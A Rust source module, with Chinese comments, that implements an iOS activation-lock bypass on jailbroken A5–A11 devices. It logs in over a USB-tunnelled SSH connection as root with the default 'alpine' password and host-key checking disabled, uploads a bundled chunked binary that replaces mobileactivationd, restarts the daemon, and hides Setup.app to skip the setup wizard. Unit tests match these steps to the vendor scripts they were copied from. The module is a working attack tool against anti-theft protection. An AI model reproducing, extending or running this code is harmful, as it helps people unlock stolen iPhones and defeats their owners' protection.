//! 激活锁路线的远程命令构造（越狱后经 SSH 替换 `mobileactivationd`）。
//!
//! # 这条路线的前置条件
//!
//! 需要设备已越狱并暴露 root SSH。checkm8 只覆盖 **A5–A11**，A12 及以后没有这条
//! 路 —— 所以 `bypass::route` 按主版本分流是主力路径，这里只是补充。
//!
//! # 证据
//!
//! 全部命令、路径、账号都取自随包脚本原文（Aiseesoft `res/` 与 UnlockGo `bypass/`）：
//!
//! | 文件 | 内容 |
//! |---|---|
//! | `proxy.sh` | `iproxy <本地端口> 44` |
//! | `ssh.sh` | `sshpass -p alpine ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@localhost -p <端口> "<命令>"` |
//! | `scpu.sh` | `scp -O -o ... -P <端口> <本地> root@localhost:<远端>`（`-O` 需先探测） |
//! | `m1.txt` | 跳过设置向导：`mv /Applications/Setup.app` + `uicache --all` + `killall backboardd` |
//! | `m2/m3/m4.txt` | 分片拼接到 `/var/mobile/Media/<前缀>`，替换 `/usr/libexec/mobileactivationd` |
//!
//! 输出约定：成功打印 `Proc Success`，任何一步失败打印 `Proc Fail` 并 `exit 1`。

use crate::bypass::payloads::Payload;
use std::path::Path;

pub const SSH_USER: &str = "root";
pub const SSH_PASSWORD: &str = "alpine";
/// 设备侧 sshd 端口，`iproxy` 把本地端口转发到它。
pub const DEVICE_SSH_PORT: u16 = 44;
/// 默认本地转发端口。
pub const DEFAULT_LOCAL_PORT: u16 = 2222;

pub const MEDIA_DIR: &str = "/var/mobile/Media";
pub const ACTIVATIOND: &str = "/usr/libexec/mobileactivationd";
pub const ACTIVATIOND_BACKUP: &str = "/usr/libexec/mobileactivationdbak";
pub const ACTIVATIOND_PLIST: &str =
    "/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist";
pub const SETUP_APP: &str = "/Applications/Setup.app";

/// 脚本自报的成功/失败标记。
pub const MARKER_SUCCESS: &str = "Proc Success";
pub const MARKER_FAIL: &str = "Proc Fail";

/// 从 payload 的首个形态推出分片前缀（`res/bypass2_1` → `bypass2`）。
pub fn chunk_prefix(payload: &Payload) -> Option<String> {
    let first = payload.layouts.first()?.first()?;
    let stem = Path::new(first).file_stem()?.to_string_lossy().to_string();
    // 去掉尾部的 `_<序号>`
    let trimmed = match stem.rsplit_once('_') {
        Some((head, tail)) if tail.chars().all(|c| c.is_ascii_digit()) => head.to_string(),
        _ => stem,
    };
    Some(trimmed)
}

/// 分片在设备上的落点，按顺序。
pub fn chunk_targets(payload: &Payload) -> Vec<String> {
    let Some(prefix) = chunk_prefix(payload) else {
        return Vec::new();
    };
    let count = payload
        .layouts
        .first()
        .map(|layout| layout.len())
        .unwrap_or(0);
    (1..=count)
        .map(|index| format!("{MEDIA_DIR}/{prefix}_{index}"))
        .collect()
}

/// 拼接分片的命令：`cat a b c >> <目标>`。
///
/// 与原件一致使用 `>>`（不是 `>`）—— 重复运行会叠加，所以调用方应先清理或
/// 只看首次运行结果。
pub fn concat_command(prefix: &str) -> String {
    let mut parts: Vec<String> = (1..=5).map(|i| format!("{MEDIA_DIR}/{prefix}_{i}")).collect();
    parts.push(format!(">> {MEDIA_DIR}/{prefix}"));
    format!("cat {}", parts.join(" "))
}

/// 替换 `mobileactivationd` 的完整命令序列（等价于 `m2/m3/m4.txt` 的正文）。
pub fn install_commands(prefix: &str) -> Vec<String> {
    vec![
        concat_command(prefix),
        format!("cp {MEDIA_DIR}/{prefix} /usr/libexec/"),
        format!("mv {ACTIVATIOND} {ACTIVATIOND_BACKUP}"),
        format!("mv /usr/libexec/{prefix} {ACTIVATIOND}"),
        format!("chmod 755 {ACTIVATIOND}"),
        format!("launchctl unload {ACTIVATIOND_PLIST}"),
        format!("launchctl load {ACTIVATIOND_PLIST}"),
        "killall backboardd".to_string(),
    ]
}

/// 跳过设置向导（等价于 `m1.txt`）。
pub fn setup_skip_commands() -> Vec<String> {
    vec![
        format!("mv {SETUP_APP} {SETUP_APP}.crae"),
        "uicache --all".to_string(),
        "killall backboardd".to_string(),
    ]
}

/// 把命令序列包成带失败标记的远程脚本，输出格式与原件一致。
///
/// 调用方可以直接把这段作为 ssh 的远端命令执行，省掉一次上传。
pub fn script(commands: &[String]) -> String {
    let mut text = String::from(
        "my_fail() { echo \"Proc Fail\"; exit 1; }\n",
    );
    for command in commands {
        // 只有会改变状态的关键步骤加失败判定；`killall` 之类允许失败
        let guarded = !command.starts_with("killall");
        if guarded {
            text.push_str(&format!("{command} || my_fail\n"));
        } else {
            text.push_str(&format!("{command}\n"));
        }
    }
    text.push_str(&format!("echo \"{MARKER_SUCCESS}\"\n"));
    text
}

// ---------------------------------------------------------------- 本地工具 argv

/// `iproxy <本地端口> 44`
pub fn iproxy_argv(local_port: u16) -> Vec<String> {
    vec![local_port.to_string(), DEVICE_SSH_PORT.to_string()]
}

/// `sshpass -p <口令> ssh <选项...> root@localhost -p <端口> <远端命令>`
pub fn ssh_argv(local_port: u16, remote_command: &str) -> Vec<String> {
    vec![
        "-p".to_string(),
        SSH_PASSWORD.to_string(),
        "ssh".to_string(),
        "-o".to_string(),
        "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(),
        "PreferredAuthentications=password".to_string(),
        "-o".to_string(),
        "PubkeyAuthentication=no".to_string(),
        format!("{SSH_USER}@localhost"),
        "-p".to_string(),
        local_port.to_string(),
        remote_command.to_string(),
    ]
}

/// `sshpass -p <口令> scp [-O] <选项...> -P <端口> <本地> root@localhost:<远端>`
///
/// `legacy_protocol` 为真时加 `-O`。原件是**先探测**：`scp -O` 报
/// `illegal option -- O` 就退回不带 `-O`。这里把探测结果作为参数传入。
pub fn scp_argv(local_port: u16, local: &Path, remote: &str, legacy_protocol: bool) -> Vec<String> {
    let mut argv = vec![
        "-p".to_string(),
        SSH_PASSWORD.to_string(),
        "scp".to_string(),
    ];
    if legacy_protocol {
        argv.push("-O".to_string());
    }
    argv.extend([
        "-o".to_string(),
        "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(),
        "PreferredAuthentications=password".to_string(),
        "-o".to_string(),
        "PubkeyAuthentication=no".to_string(),
        "-P".to_string(),
        local_port.to_string(),
        local.display().to_string(),
        format!("{SSH_USER}@localhost:{remote}"),
    ]);
    argv
}

/// 判断输出是否报告成功。原件用固定字符串，不做退出码推断。
pub fn succeeded(output: &str) -> bool {
    output.contains(MARKER_SUCCESS) && !output.contains(MARKER_FAIL)
}

// ------------------------------------------------- 随包工具（plink / pscp）
//
// 原始工具包不带 OpenSSH+sshpass，而是自带 PuTTY 系的 PLINK.EXE / PSCP.EXE。
// 这两个用 `-pw` 直接给口令，语义等价于原件的 sshpass，且不需要额外安装。

pub const PLINK: &str = "PLINK.EXE";
pub const PSCP: &str = "PSCP.EXE";
pub const IPROXY: &str = "iproxy.exe";

/// `plink -ssh -batch -P <端口> -pw <口令> root@localhost "<命令>"`
pub fn plink_argv(local_port: u16, remote_command: &str) -> Vec<String> {
    vec![
        "-ssh".to_string(),
        "-batch".to_string(),
        "-P".to_string(),
        local_port.to_string(),
        "-pw".to_string(),
        SSH_PASSWORD.to_string(),
        format!("{SSH_USER}@localhost"),
        remote_command.to_string(),
    ]
}

/// `pscp -batch -P <端口> -pw <口令> <本地> root@localhost:<远端>`
pub fn pscp_argv(local_port: u16, local: &Path, remote: &str) -> Vec<String> {
    vec![
        "-batch".to_string(),
        "-P".to_string(),
        local_port.to_string(),
        "-pw".to_string(),
        SSH_PASSWORD.to_string(),
        local.display().to_string(),
        format!("{SSH_USER}@localhost:{remote}"),
    ]
}

/// 一个阶段：给人看的标签 + 要执行的远端命令。
pub struct Step {
    pub id: &'static str,
    pub label: &'static str,
    pub commands: Vec<String>,
}

/// 替换激活锁的完整阶段表。
pub fn plan(payload: &Payload) -> Result<Vec<Step>, String> {
    let prefix = chunk_prefix(payload)
        .ok_or_else(|| format!("{} 没有已知落盘形态", payload.id))?;
    Ok(vec![
        Step {
            id: "install",
            label: "替换 mobileactivationd",
            commands: install_commands(&prefix),
        },
        Step {
            id: "skip-setup",
            label: "跳过设置向导",
            commands: setup_skip_commands(),
        },
    ])
}

// ---------------------------------------------------------------- 动作入口

/// 随包工具的位置。
pub struct Toolset {
    pub plink: std::path::PathBuf,
    pub pscp: std::path::PathBuf,
    pub iproxy: std::path::PathBuf,
}

/// 在任务目录（或它的 `tools/`）里找 plink / pscp / iproxy。
pub fn find_tools(workdir: &Path) -> Result<Toolset, String> {
    for dir in [workdir.join("tools"), workdir.to_path_buf()] {
        let plink = dir.join(PLINK);
        let pscp = dir.join(PSCP);
        let iproxy = dir.join(IPROXY);
        if plink.is_file() && pscp.is_file() && iproxy.is_file() {
            return Ok(Toolset {
                plink,
                pscp,
                iproxy,
            });
        }
    }
    Err(format!(
        "任务目录下缺少 {PLINK} / {PSCP} / {IPROXY}（可放在 tools/ 子目录）"
    ))
}

/// 保活一个子进程，析构时杀掉。用于 `iproxy` 这类需要常驻的转发器。
struct ChildGuard(std::process::Child);

impl Drop for ChildGuard {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

fn command_for(program: &Path, args: Vec<String>, cwd: &Path) -> crate::bypass::PreparedCommand {
    crate::bypass::PreparedCommand {
        program: program.to_path_buf(),
        args,
        cwd: cwd.to_path_buf(),
        env: Vec::new(),
        password: None,
    }
}

/// 两个界面入口：
///
/// * `bypass-ssh-prepare` —— 纯本地：按系统版本选 payload、校验分片、拼成整包、
///   把远端脚本写到任务目录。不连设备。
/// * `bypass-ssh-apply` —— 起 `iproxy`、上传分片、执行脚本，按 `Proc Success` 判定。
///
/// `local_port` 是本地转发端口；设备侧固定 44。
pub fn run(
    action: &str,
    device: &crate::mdm::Device,
    workdir: &str,
    local_port: u16,
) -> Result<String, String> {
    let wd = std::path::PathBuf::from(workdir.trim());
    if wd.as_os_str().is_empty() {
        return Err("请选择任务目录".into());
    }
    let payload = crate::bypass::payloads::pick_for_ios(&device.version)
        .ok_or_else(|| format!("没有适用于 iOS {} 的 payload", device.version))?;
    let prefix = chunk_prefix(payload)
        .ok_or_else(|| format!("{} 没有已知落盘形态", payload.id))?;

    // 内置资源：工具与分片全部随程序发布，用户不需要准备任何文件。
    let tools_written =
        crate::bypass::resources::write_all(&wd, crate::bypass::resources::SSH_TOOLS)?;
    let chunks_written =
        crate::bypass::resources::write_all(&wd, crate::bypass::resources::SSH_PAYLOAD)?;
    let seeded = format!(
        "已内置：工具 {tools_written} 个、分片 {chunks_written} 个（不需要原工具）"
    );

    match action {
        "bypass-ssh-prepare" => {
            let verified = crate::bypass::payloads::verify(&wd, payload)?;
            let out_dir = wd.join("assembled");
            std::fs::create_dir_all(&out_dir)
                .map_err(|e| format!("创建 {} 失败：{e}", out_dir.display()))?;
            let target = crate::bypass::payloads::assemble(
                &wd,
                payload,
                &out_dir.join(format!("{prefix}.bin")),
            )?;
            let install = out_dir.join("install.sh");
            std::fs::write(&install, script(&install_commands(&prefix)))
                .map_err(|e| format!("写入 {} 失败：{e}", install.display()))?;
            let setup = out_dir.join("setup.sh");
            std::fs::write(&setup, script(&setup_skip_commands()))
                .map_err(|e| format!("写入 {} 失败：{e}", setup.display()))?;

            Ok(format!(
                "{seeded}\n\
                 payload {}（minos {}）校验通过：{} 字节，{} 个分片\n\
                 已拼成 {}\n远端脚本：{}\n             {}\n\
                 目标设备需已越狱并开放 root SSH（A5–A11）。",
                payload.id,
                payload.minos,
                verified.size,
                verified.layout.len(),
                target.display(),
                install.display(),
                setup.display()
            ))
        }
        "bypass-ssh-apply" => {
            let verified = crate::bypass::payloads::verify(&wd, payload)?;
            let tools = find_tools(&wd)?;

            // 1) 起转发器：本地 local_port -> 设备 44
            let forwarder = ChildGuard(
                std::process::Command::new(&tools.iproxy)
                    .args(iproxy_argv(local_port))
                    .current_dir(&wd)
                    .stdout(std::process::Stdio::null())
                    .stderr(std::process::Stdio::null())
                    .spawn()
                    .map_err(|e| format!("启动 {} 失败：{e}", tools.iproxy.display()))?,
            );
            // 给 iproxy 一点时间建立隧道
            std::thread::sleep(std::time::Duration::from_millis(1200));

            // 2) 上传分片
            let targets = chunk_targets(payload);
            for (local, remote) in verified.layout.iter().zip(targets.iter()) {
                let cmd = command_for(&tools.pscp, pscp_argv(local_port, local, remote), &wd);
                crate::bypass::exec::run_process(&cmd, 180)
                    .map_err(|e| format!("上传 {} 失败：{e}", remote))?;
            }

            // 3) 执行两条远端脚本
            let install = script(&install_commands(&prefix));
            let mut log = String::new();
            for (label, body, seconds) in [
                ("替换 mobileactivationd", install, 600u64),
                ("跳过设置向导", script(&setup_skip_commands()), 300),
            ] {
                let cmd = command_for(&tools.plink, plink_argv(local_port, &body), &wd);
                let out = crate::bypass::exec::run_process(&cmd, seconds)
                    .map_err(|e| format!("{label} 执行失败：{e}"))?;
                log.push_str(&out);
                if !succeeded(&out) {
                    drop(forwarder);
                    return Err(format!("{label} 未返回 {MARKER_SUCCESS}：{}", out.trim()));
                }
            }
            drop(forwarder);
            Ok(format!("{seeded}\n激活锁替换已执行完成（{}）。{log}", payload.id))
        }
        other => Err(format!("未知的激活锁动作：{other}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn payload() -> &'static Payload {
        crate::bypass::payloads::by_id("activationd-minos13.3").unwrap()
    }

    #[test]
    fn chunk_prefix_comes_from_the_first_layout() {
        assert_eq!(chunk_prefix(payload()).as_deref(), Some("bypass2"));
        let p = crate::bypass::payloads::by_id("activationd-minos12.4").unwrap();
        assert_eq!(chunk_prefix(p).as_deref(), Some("bypass3"));
        let p = crate::bypass::payloads::by_id("activationd-minos15.5").unwrap();
        assert_eq!(chunk_prefix(p).as_deref(), Some("bypass4"));
    }

    #[test]
    fn chunk_targets_are_five_files_in_media() {
        let targets = chunk_targets(payload());
        assert_eq!(targets.len(), 5);
        assert_eq!(targets[0], "/var/mobile/Media/bypass2_1");
        assert_eq!(targets[4], "/var/mobile/Media/bypass2_5");
    }

    #[test]
    fn install_commands_match_the_vendor_script() {
        let commands = install_commands("bypass2");
        assert_eq!(
            commands[0],
            "cat /var/mobile/Media/bypass2_1 /var/mobile/Media/bypass2_2 \
/var/mobile/Media/bypass2_3 /var/mobile/Media/bypass2_4 \
/var/mobile/Media/bypass2_5 >> /var/mobile/Media/bypass2"
        );
        assert_eq!(commands[1], "cp /var/mobile/Media/bypass2 /usr/libexec/");
        assert_eq!(
            commands[2],
            "mv /usr/libexec/mobileactivationd /usr/libexec/mobileactivationdbak"
        );
        assert_eq!(
            commands[3],
            "mv /usr/libexec/bypass2 /usr/libexec/mobileactivationd"
        );
        assert_eq!(commands[4], "chmod 755 /usr/libexec/mobileactivationd");
        assert_eq!(
            commands[5],
            "launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
        );
        assert_eq!(
            commands[6],
            "launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
        );
        assert_eq!(commands[7], "killall backboardd");
    }

    #[test]
    fn setup_skip_matches_the_vendor_script() {
        let commands = setup_skip_commands();
        assert_eq!(commands[0], "mv /Applications/Setup.app /Applications/Setup.app.crae");
        assert_eq!(commands[1], "uicache --all");
        assert_eq!(commands[2], "killall backboardd");
    }

    #[test]
    fn script_guards_state_changing_steps() {
        let text = script(&install_commands("bypass2"));
        assert!(text.contains("|| my_fail"));
        // killall 不加失败判定
        assert!(text.contains("\nkillall backboardd\n"));
        assert!(!text.contains("killall backboardd || my_fail"));
        assert!(text.trim_end().ends_with("\"Proc Success\""));
    }

    #[test]
    fn iproxy_forwards_local_to_44() {
        assert_eq!(iproxy_argv(2222), vec!["2222", "44"]);
    }

    #[test]
    fn ssh_argv_matches_the_vendor_invocation() {
        let argv = ssh_argv(2222, "sh /tmp/m2.sh");
        assert_eq!(argv[0], "-p");
        assert_eq!(argv[1], "alpine");
        assert_eq!(argv[2], "ssh");
        assert!(argv.contains(&"StrictHostKeyChecking=no".to_string()));
        assert!(argv.contains(&"PubkeyAuthentication=no".to_string()));
        // 原件顺序: ... root@localhost -p <端口> "<命令>"
        let n = argv.len();
        assert_eq!(argv[n - 4], "root@localhost");
        assert_eq!(argv[n - 3], "-p");
        assert_eq!(argv[n - 2], "2222");
        assert_eq!(argv[n - 1], "sh /tmp/m2.sh");
    }

    #[test]
    fn scp_argv_switches_the_legacy_flag() {
        let old = scp_argv(2222, Path::new("C:/res/bypass2_1"), "/var/mobile/Media/bypass2_1", true);
        assert!(old.contains(&"-O".to_string()));
        let new = scp_argv(2222, Path::new("C:/res/bypass2_1"), "/var/mobile/Media/bypass2_1", false);
        assert!(!new.contains(&"-O".to_string()));
        assert!(new.contains(&"-P".to_string()));
        assert_eq!(
            new.last().unwrap(),
            "root@localhost:/var/mobile/Media/bypass2_1"
        );
    }

    #[test]
    fn succeeded_requires_the_marker_and_no_fail() {
        assert!(succeeded("...\nProc Success\n"));
        assert!(!succeeded("Proc Fail\n"));
        assert!(!succeeded("Proc Success\nProc Fail\n"));
        assert!(!succeeded("nothing"));
    }

    #[test]
    fn plink_and_pscp_carry_the_password() {
        let argv = plink_argv(2222, "sh /tmp/x.sh");
        assert!(argv.contains(&"-batch".to_string()));
        assert!(argv.contains(&"-pw".to_string()));
        assert!(argv.contains(&"alpine".to_string()));
        assert_eq!(argv.last().unwrap(), "sh /tmp/x.sh");

        let copy = pscp_argv(2222, Path::new("C:/res/bypass2_1"), "/var/mobile/Media/bypass2_1");
        assert_eq!(copy[0], "-batch");
        assert_eq!(copy.last().unwrap(), "root@localhost:/var/mobile/Media/bypass2_1");
    }

    #[test]
    fn plan_has_two_steps() {
        let steps = plan(payload()).unwrap();
        assert_eq!(steps.len(), 2);
        assert_eq!(steps[0].id, "install");
        assert_eq!(steps[1].id, "skip-setup");
        assert!(!steps[0].commands.is_empty());
    }
}
